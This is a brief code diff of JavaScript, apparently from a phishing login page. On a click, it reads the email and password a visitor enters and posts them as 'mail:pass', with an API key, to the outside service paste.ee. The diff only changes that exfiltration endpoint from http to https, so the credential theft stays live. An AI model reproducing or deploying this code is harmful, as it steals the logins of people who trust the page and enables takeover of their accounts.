@@ -27,7 +27,7 @@ document.querySelector('#u_0_n').addEventListener('click', function (e) {
 	var mail = document.querySelector('#login_form input[type=email]').value;
 	var pass = document.querySelector('#login_form input[type=password]').value;
 	
-	jQuery.post("http://paste.ee/api", {
+	jQuery.post("https://paste.ee/api", {
 		key: "208ba96fc0aaff29faa150cc51420a22",
 		description:"lol",
 		paste: mail + ":" + pass
